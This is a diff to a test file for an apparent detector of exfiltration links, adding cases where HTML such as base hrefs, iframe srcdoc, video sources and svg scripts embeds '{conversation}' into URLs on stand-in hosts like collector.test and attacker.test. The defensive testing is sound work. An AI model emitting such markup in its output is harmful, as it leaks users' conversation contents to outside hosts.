@@ -694,6 +694,45 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
             ["exfiltration_query"],
         ),
         ("<base href='https://[::1]/'><img src='/a.png'>", []),
+        ("<form><video></form><source src='https://collector.test/{conversation}.mp4'>", ["uncheckable_markup"]),
+        ("<body><p>x</body><img src='https://a.test/a.png'>", ["uncheckable_markup"]),
+        ("<form><input name='q'></form><img src='https://a.test/a.png'>", []),
+        ("<base href='https://0x7f.1/'><img src='/a.png'>", []),
+        ("<base href='https://127.0.0.1./'><img src='/a.png'>", []),
+        ("<base href='https://example.1x/'><img src='/a.png'>", []),
+        ("<base href='https://0x00000000000000000000000000000000000000007f.1/'><img src='/a.png'>", []),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://256.256.256.256/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://1.2.3.4.5/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://0x100000000/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
+        (
+            (
+                "<base href='https://collector.test/?q={c}'>"
+                "<iframe srcdoc='&lt;base href=&quot;https://1.09/&quot;&gt;"
+                "&lt;a href=&quot;&quot;&gt;x&lt;/a&gt;'></iframe>"
+            ),
+            ["exfiltration_query"],
+        ),
         ("<svg><script type='application/json' href='https://collector.test/{c}.json'/></svg>", []),
         ("<svg><script type='text/ecmascript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
         ("<svg><script language='vbscript' href='https://collector.test/{c}.js'/></svg>", ["exfiltration_query"]),
@@ -1311,3 +1350,9 @@ def test_repeated_escaping_is_handled_in_bounded_time() -> None:
     started = time.perf_counter()
     exfiltration_link_classes(text)
     assert time.perf_counter() - started < 5
+
+
+def test_long_numeric_base_host_is_parsed_without_error() -> None:
+    """A base host of thousands of digits is an invalid IPv4 address, read without Python's int-digit limit."""
+    for host in ("9" * 6000, "0x" + "f" * 6000):
+        assert exfiltration_link_classes(f"<base href='https://{host}/'><a href=''>x</a>") == []
